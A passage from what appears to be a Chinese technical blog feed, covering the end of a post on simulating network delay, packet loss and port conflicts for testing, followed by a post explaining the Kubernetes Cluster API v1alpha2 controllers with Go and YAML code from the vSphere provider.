3005ms</span><br><span class="line">rtt min/avg/max/mdev = 8.381/8.485/8.769/0.198 ms</span><br></pre></td></tr></table></figure><p>可以看到延迟稳定在 8ms 左右。</p><p>除了 <code>tc</code> 工具外，前几天看到了一个 Golang 实现的 L4 网络代理<a href="https://github.com/fagongzi/netproxy" target="_blank" rel="noopener">项目</a>，可以模拟延迟和丢包，具体关于故障模拟的代码如下：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(t *TCPServer)</span> <span class="title">doWrite</span><span class="params">(bytes []<span class="keyword">byte</span>, conn goetty.IOSession, ctl *conf.CtlUnit)</span></span> &#123;</span><br><span class="line"><span class="keyword">if</span> ctl.DelayMs &gt; <span class="number">0</span> &#123;</span><br><span class="line">log.Infof(<span class="string">"Delay &lt;%d&gt;ms write to &lt;%s&gt;"</span>, ctl.DelayMs, t.proxyUnit.Target)</span><br><span class="line">time.Sleep(time.Millisecond * time.Duration(ctl.DelayMs))</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">conn.WriteAndFlush(bytes)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> &#123;</span><br><span class="line">_, err = session.Read()</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Infof(<span class="string">"Read from client&lt;%s&gt; failure.err=%+v"</span>, session.RemoteAddr(), err)</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="comment">// write to target</span></span><br><span class="line">ctl := t.proxyUnit.Ctl</span><br><span class="line">bytes := in.RawBuf()[in.GetReaderIndex():in.GetWriteIndex()]</span><br><span class="line"><span class="keyword">if</span> <span class="number">0</span> == ctl.Out.LossRate &#123;</span><br><span class="line">log.Debugf(<span class="string">"write %d bytes to &lt;%s&gt;"</span>, <span class="built_in">len</span>(bytes), conn.RemoteAddr())</span><br><span class="line">t.doWrite(bytes, conn, ctl.Out)</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">if</span> t.rnd.Intn(<span class="number">100</span>) &gt; ctl.Out.LossRate &#123;</span><br><span class="line">log.Debugf(<span class="string">"write %d bytes to &lt;%s&gt;"</span>, <span class="built_in">len</span>(bytes), conn.RemoteAddr())</span><br><span class="line">t.doWrite(bytes, conn, ctl.Out)</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">log.Debugf(<span class="string">"Loss write %d bytes to &lt;%s&gt;"</span>, <span class="built_in">len</span>(bytes), conn.RemoteAddr())</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">in.SetReaderIndex(in.GetWriteIndex())</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h2 id="端口"><a href="#端口" class="headerlink" title="端口"></a>端口</h2><h3 id="占用"><a href="#占用" class="headerlink" title="占用"></a>占用</h3><p>在使用 Zookeeper 这类有状态应用时，除了通过 service 是否处于 running 来判断服务是否运行外，还需要判断节点的 zk 角色是否符合预期，如 leader 或 follower。</p><p>前几天又一个场景需要造出 Zookeeper 处于运行中，但是角色状态处于异常状态，我通过 <code>nc</code> 来实现的：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@yiran ~]# nc -kl 2181</span><br></pre></td></tr></table></figure><p>现将端口占用，然后启动 Zookeeper，就可以了。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>故障模拟的主要使用场景是产品的自动化测试中，平时主要是辅助开发来自测，不需要记住具体参数，但是最好了解到什么场景下有什么工具可以使用，省时省力。</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul><li><a href="https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/6/html/virtualization_administration_guide/sect-managing_guest_virtual_machines_with_virsh-attaching_and_updating_a_device_with_virsh" target="_blank" rel="noopener">https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/6/html/virtualization_administration_guide/sect-managing_guest_virtual_machines_with_virsh-attaching_and_updating_a_device_with_virsh</a></li><li><a href="https://www.enodev.fr/posts/emulate-a-slow-block-device-with-dm-delay.html" target="_blank" rel="noopener">https://www.enodev.fr/posts/emulate-a-slow-block-device-with-dm-delay.html</a></li><li><a href="https://www.kernel.org/doc/Documentation/device-mapper/dm-flakey.txt" target="_blank" rel="noopener">https://www.kernel.org/doc/Documentation/device-mapper/dm-flakey.txt</a></li><li><a href="https://github.com/fagongzi/netproxy" target="_blank" rel="noopener">https://github.com/fagongzi/netproxy</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;背景&quot;&gt;&lt;a href=&quot;#背景&quot; class=&quot;headerlink&quot; title=&quot;背景&quot;&gt;&lt;/a&gt;背景&lt;/h2&gt;&lt;p&gt;在日常开发时，有时候需要保证自己代码的健壮性，需要模拟各种故障测试，比如：磁盘、网络、端口等，今天来汇总一下平时使用最多的几种故障模拟方法&lt;
      
    
    </summary>
    
    
      <category term="Linux" scheme="https://zdyxry.github.io/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>Kubernetes 实战-Cluster API v1alpha2</title>
    <link href="https://zdyxry.github.io/2019/08/23/Kubernetes-%E5%AE%9E%E6%88%98-Cluster-API-v1alpha2/"/>
    <id>https://zdyxry.github.io/2019/08/23/Kubernetes-实战-Cluster-API-v1alpha2/</id>
    <published>2019-08-23T12:13:50.000Z</published>
    <updated>2019-08-23T13:45:21.171Z</updated>
    
    <content type="html"><![CDATA[<h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>今天继续来聊一聊 cluster-api，在上周看 cluster-api-provider-vsphere 代码的时候吐槽过，cluster-api 最近因为 v1alpha2 版本的开发，变化太快，几乎每天都在变，那么我们就来看看 v1alpha2 具体做了什么。</p><h2 id="Cluster-API-v1alpha2"><a href="#Cluster-API-v1alpha2" class="headerlink" title="Cluster-API v1alpha2"></a>Cluster-API v1alpha2</h2><p>虽然目前 v1alpha2 还没有正式的 release，但是已经趋于稳定，且两个主要的 provider：aws 和 vsphere 都在进行 v1alpha2 版本的适配（最近每天都有 pr 更新）。我们先来了解下为啥要进行 v1alpha2 改动，改动的目的是啥。</p><p>在 v1alpha1 版本中，cluster-api 要求 provider 实现从节点置备到 k8s 部署的全套流程，cluster-api 自身只负责具体的 API 定义及相关控制，在 provider 实现上也不是一个标准的 Operator，（至少）我从概念的理解上比较吃力，每个 provider 需要实现对应 cluster  与 machine 的 actuator ，开发起来要求对 cluster-api 项目本身很熟悉。</p><p>其次，每个 provider 都包含了 k8s 集群部署的流程，虽然大部分实现最终都是使用 kubeadm 工具，但是使用方式千差万别，有 cloud-init、有 ssh 配合密钥、有 ssh 配合密码等等。这部分 provider 中的代码完全都是重复的，可以复用的。</p><p>上面提到的一些缺点，在 v1alpha2 版本中进行了改进，对各个组件进行了拆分，现在使用 cluster-api 需要 3 个控制器：</p><ol><li>Core(cluster-api)</li><li>Bootstrap(kubeadm)</li><li>Infrastructure(aws, gcp, azure, vsphere, etc)</li></ol><img src="/2019/08/23/Kubernetes-实战-Cluster-API-v1alpha2/v1alpha2.png" title="v1alpha2"><p>下面来说说各个控制器负责什么。</p><h2 id="Core-cluster-api"><a href="#Core-cluster-api" class="headerlink" title="Core(cluster-api)"></a>Core(cluster-api)</h2><p>核心控制器，也就是 cluster-api 项目自身，相比于 v1alpha1 版本 v1alpha2 各个方面简直可爱，来看看具体的改动：</p><h3 id="clusterctl"><a href="#clusterctl" class="headerlink" title="clusterctl"></a>clusterctl</h3><p>在 v1alpha1 中，clusterctl 因为耦合了最终的 provider 项目，命令行是由对应的 provider 提供，在 v1alpha2 中完全由 cluster-api 维护。具体代码在 <a href="https://github.com/kubernetes-sigs/cluster-api/blob/master/cmd/clusterctl/README.md" target="_blank" rel="noopener">cmd/clusterctl</a> 下，整体结构感觉跟 kubeadm 很像。</p><h3 id="API"><a href="#API" class="headerlink" title="API"></a>API</h3><p>仍然包含两个主要的 CRD：cluster 和 machine，针对两个资源进行了阶段定义，根据注释就很好 cluster 和 machine 会处于哪些状态：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> (</span><br><span class="line"><span class="comment">// MachinePhasePending is the first state a Machine is assigned by</span></span><br><span class="line"><span class="comment">// Cluster API Machine controller after being created.</span></span><br><span class="line">MachinePhasePending = MachinePhase(<span class="string">"pending"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// MachinePhaseProvisioning is the state when the</span></span><br><span class="line"><span class="comment">// Machine infrastructure is being created.</span></span><br><span class="line">MachinePhaseProvisioning = MachinePhase(<span class="string">"provisioning"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// MachinePhaseProvisioned is the state when its</span></span><br><span class="line"><span class="comment">// infrastructure has been created and configured.</span></span><br><span class="line">MachinePhaseProvisioned = MachinePhase(<span class="string">"provisioned"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// MachinePhaseRunning is the Machine state when it has</span></span><br><span class="line"><span class="comment">// become a Kubernetes Node in a Ready state.</span></span><br><span class="line">MachinePhaseRunning = MachinePhase(<span class="string">"running"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// MachinePhaseDeleting is the Machine state when a delete</span></span><br><span class="line"><span class="comment">// request has been sent to the API Server,</span></span><br><span class="line"><span class="comment">// but its infrastructure has not yet been fully deleted.</span></span><br><span class="line">MachinePhaseDeleting = MachinePhase(<span class="string">"deleting"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// MachinePhaseDeleted is the Machine state when the object</span></span><br><span class="line"><span class="comment">// and the related infrastructure is deleted and</span></span><br><span class="line"><span class="comment">// ready to be garbage collected by the API Server.</span></span><br><span class="line">MachinePhaseDeleted = MachinePhase(<span class="string">"deleted"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// MachinePhaseFailed is the Machine state when the system</span></span><br><span class="line"><span class="comment">// might require user intervention.</span></span><br><span class="line">MachinePhaseFailed = MachinePhase(<span class="string">"failed"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// MachinePhaseUnknown is returned if the Machine state cannot be determined.</span></span><br><span class="line">MachinePhaseUnknown = MachinePhase(<span class="string">""</span>)</span><br><span class="line">)</span><br></pre></td></tr></table></figure><h3 id="Controller"><a href="#Controller" class="headerlink" title="Controller"></a>Controller</h3><p>cluster-api 不再负责具体的 API 所有资源的定义，而是通过设置资源的 owner 来达到最终 cluster 包含 machine 的效果。</p><p>用 AWS 官方示例展示：</p><p>cluster.yaml<br><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="attr">apiVersion:</span> <span class="string">cluster.x-k8s.io/v1alpha2</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Cluster</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line"><span class="attr">  name:</span> <span class="string">$&#123;CLUSTER_NAME&#125;</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line"><span class="attr">  clusterNetwork:</span></span><br><span class="line"><span class="attr">    pods:</span></span><br><span class="line"><span class="attr">      cidrBlocks:</span> <span class="string">["192.168.0.0/16"]</span></span><br><span class="line"><span class="attr">  infrastructureRef:</span></span><br><span class="line"><span class="attr">    apiVersion:</span> <span class="string">infrastructure.cluster.x-k8s.io/v1alpha2</span></span><br><span class="line"><span class="attr">    kind:</span> <span class="string">AWSCluster</span></span><br><span class="line"><span class="attr">    name:</span> <span class="string">$&#123;CLUSTER_NAME&#125;</span></span><br><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="attr">apiVersion:</span> <span class="string">infrastructure.cluster.x-k8s.io/v1alpha2</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">AWSCluster</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line"><span class="attr">  name:</span> <span class="string">$&#123;CLUSTER_NAME&#125;</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line"><span class="attr">  region:</span> <span class="string">$&#123;AWS_REGION&#125;</span></span><br><span class="line"><span class="attr">  sshKeyName:</span> <span class="string">$&#123;SSH_KEY_NAME&#125;</span></span><br></pre></td></tr></table></figure></p><p>在执行完 <code>kubectl apply -f cluster.yaml</code> 后， aws cluster 控制器会等待 cluster-api 控制器将 <code>AWSCluster</code> 与 <code>Cluster</code> 资源进行关联后进行下一步操作，这样最终能够达到 <code>Cluster</code> 资源是所有资源的 owner，也可以获得到所有资源的具体的 Spec 和 Status 信息。</p><p>（等版本 release 之后好好了解下其中的关系。</p><h2 id="Boostrap-kubeadm"><a href="#Boostrap-kubeadm" class="headerlink" title="Boostrap(kubeadm)"></a>Boostrap(kubeadm)</h2><p>相比 cluster-api 的复杂，目前 Bootstrap 的唯一实现 <a href="https://github.com/kubernetes-sigs/cluster-api-bootstrap-provider-kubeadm" target="_blank" rel="noopener">CABPK</a> 是一个分拆出来的独立项目，这个项目的主要目的是通过 <code>Cluster</code> 和 <code>Machine</code> 及对应的 Infrastructure <code>Cluster</code> 和 <code>Machine</code> 信息，来生成 cloud-init 配置（Userdata）。</p><p>目前 v1alpha2 统一部署 k8s 集群的方式为 cloud-init ，通过 CABPK 项目生成对应 Machine 的 cloud-init 配置，在部署虚拟机的时候传递 Userdata，达到自动配置的效果。也就是说如果你的 Hypervisor 不支持 cloud-init，就没办法使用 cluster-api v1alpha2 进行部署，只能通过 v1alpha1 的方式，在 Infrastructure 控制器做所有事情。</p><p>需要注意的是，在 Infrastructure 控制器工作前，需要保证 Bootstrap 控制器正常工作，生成用于最终创建虚拟机的 cloud-init 配置。</p><h2 id="Infrastructure"><a href="#Infrastructure" class="headerlink" title="Infrastructure"></a>Infrastructure</h2><p>前面说的两个控制器都是社区官方维护的，下面来说下各个厂家（provider）维护的 Infrastructure 控制器（最近几天都在搞这个）。</p><p>v1alpha2 版本要求各个 provider 实现一个标准且完整的 Operator。包含对应的 <code>Cluster</code>,<code>Machine</code>。以下还是使用 cluster-api-provider-vsphere 具体，截止到 20190823 ，<a href="https://github.com/kubernetes-sigs/cluster-api-provider-vsphere/pulls" target="_blank" rel="noopener">对应 PR</a> 还处于未完成状态。</p><h3 id="API-1"><a href="#API-1" class="headerlink" title="API"></a>API</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">// VSphereClusterSpec defines the desired state of VSphereCluster</span></span><br><span class="line"><span class="keyword">type</span> VSphereClusterSpec <span class="keyword">struct</span> &#123;</span><br><span class="line">Server <span class="keyword">string</span> <span class="string">`json:"server,omitempty"`</span></span><br><span class="line">Username <span class="keyword">string</span> <span class="string">`json:"username,omitempty"`</span></span><br><span class="line">Password <span class="keyword">string</span> <span class="string">`json:"password,omitempty"`</span></span><br><span class="line">Insecure *<span class="keyword">bool</span> <span class="string">`json:"insecure,omitempty"`</span></span><br><span class="line">SSHAuthorizedKeys []<span class="keyword">string</span> <span class="string">`json:"sshAuthorizedKeys,omitempty"`</span></span><br><span class="line">CloudProviderConfiguration cloud.Config <span class="string">`json:"cloudProviderConfiguration,omitempty"`</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// VSphereClusterStatus defines the observed state of VSphereClusterSpec</span></span><br><span class="line"><span class="keyword">type</span> VSphereClusterStatus <span class="keyword">struct</span> &#123;</span><br><span class="line">Ready <span class="keyword">bool</span> <span class="string">`json:"ready"`</span></span><br><span class="line">APIEndpoints []APIEndpoint <span class="string">`json:"apiEndpoints,omitempty"`</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// VSphereMachineSpec defines the desired state of VSphereMachine</span></span><br><span class="line"><span class="keyword">type</span> VSphereMachineSpec <span class="keyword">struct</span> &#123;</span><br><span class="line">MachineRef <span class="keyword">string</span> <span class="string">`json:"machineRef,omitempty"`</span></span><br><span class="line">Template <span class="keyword">string</span> <span class="string">`json:"template"`</span></span><br><span class="line">Datacenter <span class="keyword">string</span> <span class="string">`json:"datacenter"`</span></span><br><span class="line">Network NetworkSpec <span class="string">`json:"network"`</span></span><br><span class="line">NumCPUs <span class="keyword">int32</span> <span class="string">`json:"numCPUs,omitempty"`</span></span><br><span class="line">NumCoresPerSocket <span class="keyword">int32</span> <span class="string">`json:"numCoresPerSocket,omitempty"`</span></span><br><span class="line">MemoryMiB <span class="keyword">int64</span> <span class="string">`json:"memoryMiB,omitempty"`</span></span><br><span class="line">DiskGiB <span class="keyword">int32</span> <span class="string">`json:"diskGiB,omitempty"`</span></span><br><span class="line">TrustedCerts [][]<span class="keyword">byte</span> <span class="string">`json:"trustedCerts,omitempty"`</span></span><br><span class="line">NTPServers []<span class="keyword">string</span> <span class="string">`json:"ntpServers,omitempty"`</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// VSphereMachineStatus defines the observed state of VSphereMachine</span></span><br><span class="line"><span class="keyword">type</span> VSphereMachineStatus <span class="keyword">struct</span> &#123;</span><br><span class="line">Ready <span class="keyword">bool</span> <span class="string">`json:"ready"`</span></span><br><span class="line">Addresses []v1.NodeAddress <span class="string">`json:"addresses,omitempty"`</span></span><br><span class="line">TaskRef <span class="keyword">string</span> <span class="string">`json:"taskRef,omitempty"`</span></span><br><span class="line">Network []NetworkStatus <span class="string">`json:"networkStatus,omitempty"`</span></span><br><span class="line">ErrorReason *errors.MachineStatusError <span class="string">`json:"errorReason,omitempty"`</span></span><br><span class="line">ErrorMessage *<span class="keyword">string</span> <span class="string">`json:"errorMessage,omitempty"`</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>定义 VSphereCluster 与 VSphereMachine CRD，这里根据自己需要定义相关参数就好，比如如果不想支持自定义目标虚拟机配置，那么就不用提供 CPU、Memory 等配置。</p><h3 id="Controller-1"><a href="#Controller-1" class="headerlink" title="Controller"></a>Controller</h3><p>来分别看看 cluster controller 与 machine controller 做了啥。</p><h4 id="Cluster-Controller"><a href="#Cluster-Controller" class="headerlink" title="Cluster Controller"></a>Cluster Controller</h4><p>在 <code>Reconcile</code> 的实现中，先获取 VSphereCluster 信息：<br><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">vsphereCluster := &amp;infrav1.VSphereCluster&#123;&#125;</span><br><span class="line">err := r.Get(parentContext, req.NamespacedName, vsphereCluster)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">if</span> apierrors.IsNotFound(err) &#123;</span><br><span class="line"><span class="keyword">return</span> reconcile.Result&#123;&#125;, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> reconcile.Result&#123;&#125;, err</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure></p><p>然后获取 VSphereCluster 关联的 Cluster 信息：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// util 由 cluster-api 提供</span></span><br><span class="line">cluster, err := util.GetOwnerCluster(parentContext, r.Client, vsphereCluster.ObjectMeta)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> reconcile.Result&#123;&#125;, err</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> cluster == <span class="literal">nil</span> &#123;</span><br><span class="line">logger.Info(<span class="string">"Waiting for Cluster Controller to set OwnerRef on VSphereCluster"</span>)</span><br><span class="line"><span class="keyword">return</span> reconcile.Result&#123;RequeueAfter: <span class="number">10</span> * time.Second&#125;, <span class="literal">nil</span></span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>在获取了足够的信息之后，针对这些信息，创建了 context（这里 aws 是叫 scope，是一个东西），判断是否包含 <code>DeletionTimestamp</code> 来决定进行什么调度，是 <code>reconcileDelete</code> 还是 <code>reconcileNormal</code> 。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">reconcileDelete</span><span class="params">(ctx *context.ClusterContext)</span> <span class="params">(reconcile.Result, error)</span></span> &#123;</span><br><span class="line">ctx.Logger.Info(<span class="string">"Reconciling VSphereCluster delete"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// Cluster is deleted so remove the finalizer.</span></span><br><span class="line">ctx.VSphereCluster.Finalizers = util.Filter(ctx.VSphereCluster.Finalizers, infrav1.ClusterFinalizer)</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> reconcile.Result&#123;&#125;, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在所有的 provider 中，都对相应资源进行了 Finalizer 配置，方便后续在资源删除前进行一些额外的操作，这里 vsphere 还没有具体的实现。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">reconcileNormal</span><span class="params">(ctx *context.ClusterContext)</span> <span class="params">(reconcile.Result, error)</span></span> &#123;</span><br><span class="line">ctx.Logger.Info(<span class="string">"Reconciling VSphereCluster"</span>)</span><br><span class="line"></span><br><span class="line">vsphereCluster := ctx.VSphereCluster</span><br><span class="line"></span><br><span class="line"><span class="comment">// If the VSphereCluster doesn't have our finalizer, add it.</span></span><br><span class="line"><span class="keyword">if</span> !util.Contains(vsphereCluster.Finalizers, infrav1.ClusterFinalizer) &#123;</span><br><span class="line">vsphereCluster.Finalizers = <span class="built_in">append</span>(vsphereCluster.Finalizers, infrav1.ClusterFinalizer)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Set APIEndpoints so the Cluster API Cluster Controller can pull them</span></span><br><span class="line">vsphereCluster.Status.APIEndpoints = []infrav1.APIEndpoint&#123;</span><br><span class="line">&#123;</span><br><span class="line">Host: <span class="string">""</span>, <span class="comment">// vsphereCluster.Status.Network.APIServerELB.DNSName,</span></span><br><span class="line">Port: <span class="number">0</span>,</span><br><span class="line">&#125;,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// No errors, so mark us ready so the Cluster API Cluster Controller can pull it</span></span><br><span class="line">vsphereCluster.Status.Ready = <span class="literal">true</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> reconcile.Result&#123;&#125;, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在 <code>reconcileNormal</code> 中对集群进行 Finalizer 判断，然后这里直接更新了 <code>vsphereCluster.Status</code> 具体字段，应该是还没实现完成。</p><h4 id="Machine-Controller"><a href="#Machine-Controller" class="headerlink" title="Machine Controller"></a>Machine Controller</h4><p>与 Cluster 相比，Machine 包含了具体的虚拟机创建动作，相应需要的信息也会多一些，除了通过 <code>VSphereMachine</code>获取关联 <code>Machine</code> 以外，还通过 <code>Machine</code> 获取了 <code>Cluster</code> 信息：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Fetch the Machine.</span></span><br><span class="line">machine, err := util.GetOwnerMachine(parentContext, r.Client, vsphereMachine.ObjectMeta)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> reconcile.Result&#123;&#125;, err</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> machine == <span class="literal">nil</span> &#123;</span><br><span class="line">logger.Info(<span class="string">"Waiting for Machine Controller to set OwnerRef on VSphereMachine"</span>)</span><br><span class="line"><span class="keyword">return</span> reconcile.Result&#123;RequeueAfter: <span class="number">10</span> * time.Second&#125;, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">logger = logger.WithName(fmt.Sprintf(<span class="string">"machine=%s"</span>, machine.Name))</span><br><span class="line"></span><br><span class="line"><span class="comment">// Fetch the Cluster.</span></span><br><span class="line">cluster, err := util.GetClusterFromMetadata(parentContext, r.Client, machine.ObjectMeta)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">logger.Info(<span class="string">"Machine is missing cluster label or cluster does not exist"</span>)</span><br><span class="line"><span class="keyword">return</span> reconcile.Result&#123;&#125;, <span class="literal">nil</span></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>与 Cluster 一样，也会进行 <code>DeletionTimestamp</code> 判断，来看下 <code>reconcileNormal</code> 的实现：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span 